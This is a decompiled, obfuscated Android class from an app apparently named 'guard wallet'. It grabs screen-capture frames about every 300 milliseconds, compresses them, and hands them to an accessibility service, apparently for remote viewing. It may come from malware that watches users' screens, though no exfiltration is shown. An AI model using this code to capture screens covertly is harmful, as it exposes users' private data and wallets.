package p020x;

import a1.AbstractC0026q;
import android.graphics.Bitmap;
import android.media.Image;
import android.media.ImageReader;
import android.util.Log;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0251g;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;

/* renamed from: x.b */
/* loaded from: classes.dex */
public final class C0968b implements ImageReader.OnImageAvailableListener {

    /* renamed from: a */
    public final AtomicReference f2303a = new AtomicReference();

    /* renamed from: b */
    public final AtomicLong f2304b = new AtomicLong(0);

    @Override // android.media.ImageReader.OnImageAvailableListener
    public final void onImageAvailable(ImageReader imageReader) {
        Bitmap bitmap;
        Image acquireLatestImage = imageReader.acquireLatestImage();
        if (acquireLatestImage != null) {
            long currentTimeMillis = System.currentTimeMillis();
            AtomicLong atomicLong = this.f2304b;
            if (currentTimeMillis - atomicLong.get() > 300) {
                try {
                    int width = acquireLatestImage.getWidth();
                    int height = acquireLatestImage.getHeight();
                    Image.Plane[] planes = acquireLatestImage.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    bitmap = Bitmap.createBitmap(width + ((planes[0].getRowStride() - (pixelStride * width)) / pixelStride), height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);
                } catch (Exception e2) {
                    AbstractC0026q.m186s("BitmapUtils", e2);
                    bitmap = null;
                }
                if (bitmap != null) {
                    Log.d("x.b", "new Bitmap is Save");
                    AtomicReference atomicReference = this.f2303a;
                    AbstractC0251g.J0((Bitmap) atomicReference.get());
                    atomicReference.set(bitmap);
                    byte[] M0 = AbstractC0251g.M0(bitmap, 0.25f, 25);
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().getClass();
                        MyAccessibilityService.a0(M0);
                    }
                }
                atomicLong.set(currentTimeMillis);
            }
            acquireLatestImage.close();
        }
    }
}
